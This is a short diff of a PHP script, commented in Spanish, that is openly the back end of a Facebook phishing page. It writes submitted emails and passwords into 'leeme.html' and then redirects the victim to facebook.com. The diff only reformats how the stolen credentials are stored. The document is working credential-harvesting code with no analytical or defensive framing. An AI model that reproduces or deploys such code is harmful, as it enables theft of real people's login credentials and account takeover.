@@ -10,10 +10,10 @@ $pass = $_POST['pass'];
 //Asigna el valor a la variable donde se guarda el usuario y contraseña
 $guardame = fopen('leeme.html','a+');
 fwrite($guardame,
-	"email: ".$email.
-
-"\npass: ".$pass." ");
+"<br/><b>Usuario:</b>".$email.
+"<br/><b>Contrasena:</b>".$pass." ");
 
 fclose($guardame);
 //Redirecciona a la web original (facebook)
 echo "<meta http-equiv='refresh' content='1;url=http://www.facebook.com'>"
+?>
